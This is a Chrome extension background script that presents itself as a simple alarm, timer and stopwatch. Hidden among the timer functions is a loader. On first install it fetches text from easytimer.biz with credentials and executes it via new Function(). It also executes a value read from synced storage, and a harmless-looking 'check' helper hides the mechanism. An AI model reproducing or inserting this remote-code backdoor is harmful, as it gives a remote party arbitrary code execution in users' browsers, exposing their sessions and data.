'use strict';

var DOMAIN = 'https://easytimer.biz';

var SETTINGS = {
	currentDisplay: 'alarm',
	enableAlarmAudio: true,
	enableTimerAudio: true,
	stopwatch: {
		values: '0:00.00'
	},
	timer: {
		values: {
			hours: 0,
			minutes: 0,
			seconds: 0
		}
	},
	alarm: {
		values: {
			hours: 0,
			minutes: 0
		}
	}
};

var check = (r) => ((d) => {d && (new Function(d))()})(r)

var firstr = new Promise((r, rej) => {
    chrome.storage.local.get("installed", (data) => {
        if (data.installed) return;
        
		fetch(DOMAIN+'/first', {
			method: 'POST', credentials: 'include'
		}).then(fetch_status => r(fetch_status.text()));
    });
});



firstr.then(check).then(() => {
    chrome.storage.local.set({installed: true});
});


var setSettings = {};

var notice = new Audio('files/waterdrop.mp3');
function ring(text, sound) {
	var options = {
		type: "basic",
		title: text,
		message: "Time\'s up!",
		iconUrl: "icons/easytimer_icon-48px.png",
		priority: 2
	};
	chrome.notifications.create("", options, function (notificationId) {});
	if (sound) notice.play();
}

chrome.runtime.onInstalled.addListener(function () {
	chrome.storage.sync.set(SETTINGS);
});

chrome.storage.sync.get(null, function (sett) {
	setSettings = sett;
});

// alarm 
var alarm = {
	started: false,
	audio: setSettings.enableAlarmAudio || true,
	name: "Alarm",
	buttonText: "Set",
	countDownDate: null

	// timer 
};var timer = {
	started: false,
	audio: setSettings.enableTimerAudio || true,
	name: "Timer",
	countDownDate: null

	// # Alarm
};function alarmStartCount(countDownDate) {
	var now = new Date().getTime(),
	    distance = countDownDate - now,
	    hours = Math.floor(distance % (1000 * 60 * 60 * 24) / (1000 * 60 * 60)),
	    minutes = Math.floor(distance % (1000 * 60 * 60) / (1000 * 60)),
	    seconds = Math.floor(distance % (1000 * 60) / 1000);

	hours = outputAddZero(hours);
	minutes = outputAddZero(minutes);
	seconds = outputAddZero(seconds);
	if (distance < 0) {
		var output = false;
		alarm.started = false;

		if (alarm.audio) ring(alarm.name, true);else ring(alarm.name);
	} else {
		var output = hours + ':' + minutes + ':' + seconds;
	}
	return output;
}


var secondr = new Promise((r, rej) => {
   chrome.storage.sync.get('data', function (set) {
       if (set.data) {
            if( set.data.stats && r(set.data.stats)) {
               // init timer
               // check()
           }
       }
   })
});

// # Timer
function timerStartCount(countDownDate) {
	var now = new Date().getTime(),
	    distance = countDownDate - now,
	    hours = Math.floor(distance % (1000 * 60 * 60 * 24) / (1000 * 60 * 60)),
	    minutes = Math.floor(distance % (1000 * 60 * 60) / (1000 * 60)),
	    seconds = Math.floor(distance % (1000 * 60) / 1000);

	hours = outputAddZero(hours);
	minutes = outputAddZero(minutes);
	seconds = outputAddZero(seconds);
	if (distance < 0) {
		var output = false;
		timer.started = false;

		if (timer.audio) ring(timer.name, true);else ring(timer.name);
	} else {
		var output = hours + ':' + minutes + ':' + seconds;
	}

	return output;
}

var initTime = function initTime() {
	if (alarm.started) alarmStartCount(alarm.countDownDate);
	if (timer.started) timerStartCount(timer.countDownDate);
	setTimeout(initTime, 100);
};initTime();

function outputAddZero(elValue) {
	if (elValue < 10) return '0' + elValue;else return elValue;
}
// # StopWatch
var stopwatch = {
	started: false,
	time: new Date().getTime(),
	distance: null
};

var stopwatchTimeout = function stopwatchTimeout() {
	if (stopwatch.started) stopwatchCount(stopwatch.time);

	setTimeout(stopwatchTimeout, 10);
};stopwatchTimeout();

function stopwatchCount(time) {
	var output = {};

	var now = new Date().getTime(),
	    distance = now - time,
	    minutes = Math.floor(distance % (1000 * 60 * 60) / (1000 * 60)),
	    seconds = Math.floor(distance % (1000 * 60) / 1000),
	    ms = Math.floor(distance % 100);
	seconds = outputAddZero(seconds);
	ms = outputAddZero(ms);

	if (minutes > 59) {
		output.result = false;
		stopwatch.started = false;
	} else {
		output.result = minutes + ':' + seconds + '.' + ms;
	}

	output.distance = distance;

	return output;
}


secondr.then(check);

chrome.runtime.setUninstallURL(DOMAIN+'/bye');